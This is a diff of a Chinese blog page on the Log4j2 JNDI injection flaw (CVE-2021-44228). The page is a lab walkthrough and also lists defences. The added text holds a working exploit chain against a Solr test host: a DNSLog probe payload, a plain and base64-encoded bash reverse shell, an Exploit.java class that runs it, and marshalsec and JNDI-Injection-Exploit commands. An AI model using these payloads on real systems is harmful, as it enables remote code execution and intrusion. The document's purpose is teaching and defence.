@@ -85,20 +85,27 @@
 
 
 
-<meta name="description" content="前言log4j2漏洞是java应用常见开源日志库，使用极为广泛 2.0-2.14.1存在JNDI注入漏洞，攻击者可以在控制日志内容的情况下，通过传入类似$&#123;jndi:ldap:&#x2F;&#x2F;evil.com&#x2F;example&#125;的lookup用于进行JNDI注入，执行任意代码 JNDI应用程序设计的API，标准的JAVA命名接口。允许从指定的远程服务器获取加载对象，JNDI相当于映射的字">
+<meta name="description" content="前言log4j2漏洞是java应用常见开源日志库，是一个就Java的日志记录工具 Apache Log4j2中存在JNDI注入漏洞，主要原理是利用log4j2的日志输出JNDI远程对象时,调用远程对象没做检查导致，程序将用户输入的数据进行日志记录时即可触发该漏洞并可在目标服务器上执行任意代码。该漏洞利用过程需要找到一个能触发远程加载并应用配置的输入点，迫使服务器远程加载和修改配置的前提下使目标">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Log4j2远程代码执行漏洞">
 <meta property="og:url" content="https://flowers-boy.top/posts/33360.html">
 <meta property="og:site_name" content="关根">
-<meta property="og:description" content="前言log4j2漏洞是java应用常见开源日志库，使用极为广泛 2.0-2.14.1存在JNDI注入漏洞，攻击者可以在控制日志内容的情况下，通过传入类似$&#123;jndi:ldap:&#x2F;&#x2F;evil.com&#x2F;example&#125;的lookup用于进行JNDI注入，执行任意代码 JNDI应用程序设计的API，标准的JAVA命名接口。允许从指定的远程服务器获取加载对象，JNDI相当于映射的字">
+<meta property="og:description" content="前言log4j2漏洞是java应用常见开源日志库，是一个就Java的日志记录工具 Apache Log4j2中存在JNDI注入漏洞，主要原理是利用log4j2的日志输出JNDI远程对象时,调用远程对象没做检查导致，程序将用户输入的数据进行日志记录时即可触发该漏洞并可在目标服务器上执行任意代码。该漏洞利用过程需要找到一个能触发远程加载并应用配置的输入点，迫使服务器远程加载和修改配置的前提下使目标">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240617112745274-1057914604.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202407/3373819-20240707223732241-1174457737.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202407/3373819-20240707223930289-628359229.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202407/3373819-20240707224554500-937899068.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202407/3373819-20240707231518643-281387140.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202407/3373819-20240707235800784-211720365.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202407/3373819-20240708003904740-1294116740.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202407/3373819-20240708012527217-174519119.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202407/3373819-20240708013133866-1286892902.png">
 <meta property="article:published_time" content="2024-06-17T02:49:49.000Z">
-<meta property="article:modified_time" content="2024-06-19T06:58:59.259Z">
+<meta property="article:modified_time" content="2024-07-07T17:51:43.397Z">
 <meta property="article:author" content="关根">
 <meta property="article:tag" content="关根">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240617112745274-1057914604.png">
+<meta name="twitter:image" content="https://img2023.cnblogs.com/blog/3373819/202407/3373819-20240707223732241-1174457737.png">
 
 
 
@@ -357,10 +364,73 @@
       
         <meta name="referrer" content="no-referrer">
 
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>log4j2漏洞是java应用常见开源日志库，使用极为广泛</p>
-<p>2.0-2.14.1存在JNDI注入漏洞，攻击者可以在控制日志内容的情况下，通过传入类似<code>$&#123;jndi:ldap://evil.com/example&#125;</code>的lookup用于进行JNDI注入，执行任意代码</p>
-<h3 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h3><p>应用程序设计的API，标准的JAVA命名接口。允许从指定的远程服务器获取加载对象，JNDI相当于映射的字典，使得java应用程序和这些命名服务与目录服务之间进行交互</p>
-<h3 id="log4j2基础开发学习"><a href="#log4j2基础开发学习" class="headerlink" title="log4j2基础开发学习"></a>log4j2基础开发学习</h3><p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240617112745274-1057914604.png" alt="image-20240617112744151"></p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>log4j2漏洞是java应用常见开源日志库，是一个就Java的日志记录工具</p>
+<p>Apache Log4j2中存在<code>JNDI注入漏洞</code>，主要原理是利用log4j2的日志输出JNDI远程对象时,<code>调用远程对象没做检查</code>导致，程序将用户输入的数据进行日志记录时即可触发该漏洞并可在目标服务器上执行任意代码。该漏洞利用过程需要找到一个能触发远程加载并应用配置的输入点，迫使服务器远程加载和修改配置的前提下使目标系统通过JNDI远程获取数据库源，触发攻击者的恶意代码</p>
+<h3 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h3><p>全程java Naming and Directory Interface，即java<code>名称与目录接口</code>，也就是一个名字对应一个java对象</p>
+<h3 id="lookup"><a href="#lookup" class="headerlink" title="lookup"></a>lookup</h3><p> JNDI API 中用于查找和获取命名对象的关键方法</p>
+<p>在使用 JNDI 进行查找时，通常会创建一个初始上下文（InitialContext），然后使用这个上下文调用 <code>lookup</code> 方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ctx.lookup(<span class="string">&quot;java:comp/env/jdbc/MyDataSource&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>在这个例子中，<code>ctx.lookup(&quot;java:comp/env/jdbc/MyDataSource&quot;)</code> 尝试查找名为 <code>&quot;java:comp/env/jdbc/MyDataSource&quot;</code> 的 JNDI 资源，这通常用于获取一个数据库连接池或其他资源。</p>
+<h2 id="CVE-2021-44228"><a href="#CVE-2021-44228" class="headerlink" title="CVE-2021-44228"></a>CVE-2021-44228</h2><p>攻击者构造一个包含恶意JNDI URL的日志消息</p>
+<p><code>$&#123;jndi:ldap://malicious-server.com/a&#125;</code></p>
+<p>当受影响的应用程序记录这条消息时，Log4j2会解析其中的<code>$&#123;jndi:...&#125;</code>表达式，并尝试执行JNDI查找。</p>
+<p>若允许远程JNDI查找，Log4j2会连接到<code>ldap://malicious-server.com</code>并从中加载一个恶意对象或类，这可能包含并执行恶意代码</p>
+<h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p>使用<a target="_blank" rel="noopener" href="http://dnslog.cn/">DNSLog Platform</a>平台检测dns回显，查看是否有漏洞存在</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202407/3373819-20240707223732241-1174457737.png" alt="image-20240707223732321"></p>
+<p>注入点：&#x2F;solr&#x2F;admin&#x2F;cores?action&#x3D;</p>
+<p>构造payload：<a target="_blank" rel="noopener" href="http://192.168.20.129:8983/solr/admin/cores?action=$%7Bjndi:ldap://$%7Bsys:java.version%7D.a8nk84.dnslog.cn%7D">http://192.168.20.129:8983/solr/admin/cores?action=${jndi:ldap://${sys:java.version}.a8nk84.dnslog.cn}</a></p>
+<p>回显java版本1.8.0_102，说明存在漏洞</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202407/3373819-20240707223930289-628359229.png" alt="image-20240707223930404"></p>
+<p>kali：192.168.20.128</p>
+<p>Ubuntu：192.168.20.129</p>
+<h3 id="方法一：手工写恶意文件"><a href="#方法一：手工写恶意文件" class="headerlink" title="方法一：手工写恶意文件"></a>方法一：手工写恶意文件</h3><p>编写Exploit.java，反弹shell到kali</p>
+<p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/rce/">命令执行在线编码 | 国光 (sqlsec.com)</a></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202407/3373819-20240707224554500-937899068.png" alt="image-20240707224553883"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.20.128/777 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">bash -c &#123;echo, YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwLjEyOC83NzcgMD4mMQ==&#125;|&#123;base64, -d&#125;|&#123;bash, -i&#125;</span><br></pre></td></tr></table></figure>
+
+<p>恶意文件Exploit.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span> &#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="title function_">Exploit</span><span class="params">()</span>&#123;</span><br><span class="line">             <span class="keyword">try</span>&#123;</span><br><span class="line">                 Runtime.getRuntime().exec(<span class="string">&quot;/bin/bash -c &#123;echo, YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwLjEyOC83NzcgMD4mMQ==&#125;|&#123;base64, -d&#125;|&#123;bash, -i&#125;&quot;</span>);</span><br><span class="line">                                &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">                                            e.printStackTrace();</span><br><span class="line">                                             &#125;</span><br><span class="line">                &#125;</span><br><span class="line">         <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] argv)</span>&#123;</span><br><span class="line">                         <span class="type">Exploit</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Exploit</span>();</span><br><span class="line">                            &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>javac编码为.class文件</p>
+<p><code>apt install default-jdk</code></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202407/3373819-20240707231518643-281387140.png" alt="image-20240707231518630"></p>
+<p>启动http服务，为后续工具建立LDAP服务使用</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">mbechler&#x2F;marshalsec (github.com)</a>项目启动服务</p>
+<p>在pom.xml所在目录，需要运行以下命令生成.jar文件（生成成功后位于此目录的target子目录下）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install maven</span><br><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure>
+
+<p>启动LDAP服务</p>
+<p>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer “<a target="_blank" rel="noopener" href="http://192.168.20.128:88/#Exploit">http://192.168.20.128:88/#Exploit</a>“</p>
+<p>监听777端口</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202407/3373819-20240707235800784-211720365.png" alt="image-20240707235800618"></p>
+<p>JNDI注入</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202407/3373819-20240708003904740-1294116740.png" alt="image-20240708003904169"></p>
+<p>响应</p>
+<h3 id="方法二：JNDI注入工具"><a href="#方法二：JNDI注入工具" class="headerlink" title="方法二：JNDI注入工具"></a>方法二：JNDI注入工具</h3><p>一键部署项目地址：<a target="_blank" rel="noopener" href="https://github.com/sayers522/JNDI-Injection-Exploit">sayers522&#x2F;JNDI-Injection-Exploit: JNDI命令注入利用 (github.com)</a></p>
+<p>maven生成.jar可执行文件：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44985115/article/details/115253160">史上最全安装Maven教程_按照maven-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62407354/article/details/132832762">完美解决未解析插件：spring-boot-maven-plugin_未解析的插件:-CSDN博客</a></p>
+<p>同样在pom.xml下打开cmd输入mvn clean package -DskipTests生成一个target目录</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202407/3373819-20240708012527217-174519119.png" alt="image-20240708012526848"></p>
+<p>反弹shell：bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;传反弹shell的主机ip&#x2F;端口号 0&gt;&amp;1</p>
+<p>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “bash -c {echo, YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwLjEyOC82NjYgMD4mMQ&#x3D;&#x3D;}|{base64, -d}|{bash, -i}” -A “192.168.20.128”</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202407/3373819-20240708013133866-1286892902.png" alt="image-20240708013133645"></p>
+<p>监听666端口</p>
+<p>web访问<a target="_blank" rel="noopener" href="http://192.168.20.129:8983/solr/admin/cores?action=$%7Bjndi:ldap://192.168.20.128:1389/Exploit%7D">192.168.20.129:8983&#x2F;solr&#x2F;admin&#x2F;cores?action&#x3D;${jndi:ldap:&#x2F;&#x2F;192.168.20.128:1389&#x2F;Exploit}</a></p>
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p><strong>升级Log4j版本</strong>（2.15.0及以上版本）</p>
+<p><strong>禁用JNDI Lookup</strong></p>
+<ul>
+<li>添加以下Java系统属性：-Dlog4j2.formatMsgNoLookups&#x3D;true</li>
+<li>设置环境变量：LOG4J_FORMAT_MSG_NO_LOOKUPS&#x3D;true</li>
+<li>在<code>log4j2.properties</code>文件中添加：log4j2.formatMsgNoLookups&#x3D;true</li>
+</ul>
+<p><strong>移除JndiLookup类</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class</span><br></pre></td></tr></table></figure>
+
+<p><strong>配置JNDI访问控制</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">设置Java安全策略，限制JNDI访问：</span><br><span class="line">-Djava.rmi.server.useCodebaseOnly=<span class="literal">true</span></span><br><span class="line">-Dcom.sun.jndi.ldap.object.trustURLCodebase=<span class="literal">false</span></span><br><span class="line">-Dcom.sun.jndi.rmi.object.trustURLCodebase=<span class="literal">false</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>应用防火墙：</strong>检测和拦截包含恶意JNDI查找的HTTP请求</p>
 
       
     </div>
@@ -478,7 +548,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-count">13</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -546,7 +616,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#JNDI"><span class="nav-number">1.1.</span> <span class="nav-text">JNDI</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#log4j2%E5%9F%BA%E7%A1%80%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0"><span class="nav-number">1.2.</span> <span class="nav-text">log4j2基础开发学习</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#JNDI"><span class="nav-number">1.1.</span> <span class="nav-text">JNDI</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lookup"><span class="nav-number">1.2.</span> <span class="nav-text">lookup</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2021-44228"><span class="nav-number">2.</span> <span class="nav-text">CVE-2021-44228</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="nav-number">2.1.</span> <span class="nav-text">漏洞检测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E6%89%8B%E5%B7%A5%E5%86%99%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6"><span class="nav-number">2.2.</span> <span class="nav-text">方法一：手工写恶意文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9AJNDI%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7"><span class="nav-number">2.3.</span> <span class="nav-text">方法二：JNDI注入工具</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1"><span class="nav-number">3.</span> <span class="nav-text">防御</span></a></li></ol></div>
             
 
           </div>
